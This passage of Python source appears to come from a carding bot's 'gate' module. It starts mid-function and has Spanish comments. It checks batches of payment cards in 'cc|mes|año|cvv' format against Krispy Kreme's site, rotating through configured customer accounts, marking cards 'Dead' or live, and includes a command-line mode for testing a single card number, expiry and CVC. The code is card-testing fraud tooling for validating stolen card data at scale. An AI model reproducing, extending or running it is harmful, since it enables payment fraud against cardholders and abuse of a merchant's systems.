        loop = asyncio.get_running_loop()
        batch = _Batch(accounts)
        try:
            return await loop.run_in_executor(None, batch.check, card)
        except Exception as exc:
            _log_real(f"gate check fallo: {type(exc).__name__}: {exc}")
            return _error_result("Error interno del gate, intenta de nuevo")
        finally:
            if batch.session is not None:
                try:
                    batch.session.close()
                except Exception:
                    pass


async def radamantis_gate_check_multiple(
    cards_data: List[str],
    callback: Optional[Callable[[int, Dict[str, str], str, int], Any]] = None,
    user_id: Optional[int] = None,
) -> List[Dict[str, str]]:
    """Verifica un lote de tarjetas con UNA sola sesión (rotando de cuenta).

    El login es lo caro: se paga una vez por cuenta y se reutiliza para todas
    las tarjetas de esa cuenta.
    """
    cards = [_normalize_card(c) for c in cards_data if c and c.strip()]
    total = len(cards)
    results: List[Dict[str, str]] = []

    if total == 0:
        return []

    accounts = _load_accounts()
    if not accounts:
        _log_real("no hay cuentas configuradas (KRISPY_ACCOUNTS_FILE / KRISPY_EMAIL)")
        error = _error_result(
            "El gate no esta configurado, avisar a un administrador",
            "ERROR CONFIG",
        )
        for i, raw in enumerate(cards_data):
            results.append(error)
            if callback:
                await callback(i, error, raw, user_id or 0)
        return results

    async with _MASS_LOCK:
        batch = _Batch(accounts)
        loop = asyncio.get_running_loop()
        try:
            for index, card in enumerate(cards):
                if card is None:
                    result = {
                        "status": "❌ Dead",
                        "classification": "DEAD FORMATO",
                        "message": "Formato invalido. Usa cc|mes|año|cvv",
                        "code": "",
                        "elapsed": 0.0,
                    }
                else:
                    result = await loop.run_in_executor(None, batch.check, card)
                results.append(result)
                if callback:
                    await callback(index, result, cards_data[index], user_id or 0)
        finally:
            if batch.session is not None:
                try:
                    batch.session.close()
                except Exception:
                    pass

    return results


# ─────────────────────────────────────────────────────────────
# CLI de prueba (fuera del bot)
# ─────────────────────────────────────────────────────────────
if __name__ == "__main__":  # pragma: no cover
    import sys

    if len(sys.argv) < 5:
        print("uso: python -m bot.gates.krispy_kreme <numero> <mm> <yy> <cvc>")
        sys.exit(2)

    card = _normalize_card("|".join(sys.argv[1:5]))
    if card is None:
        print("[x] tarjeta inválida")
        sys.exit(2)

    accounts = _load_accounts()
    print(f"cuentas disponibles: {len(accounts)}")
    batch = _Batch(accounts)
    try:
        result = batch.check(card)
        print(result)
    finally:
        if batch.session is not None:
            try:
                batch.session.close()
            except Exception:
                pass
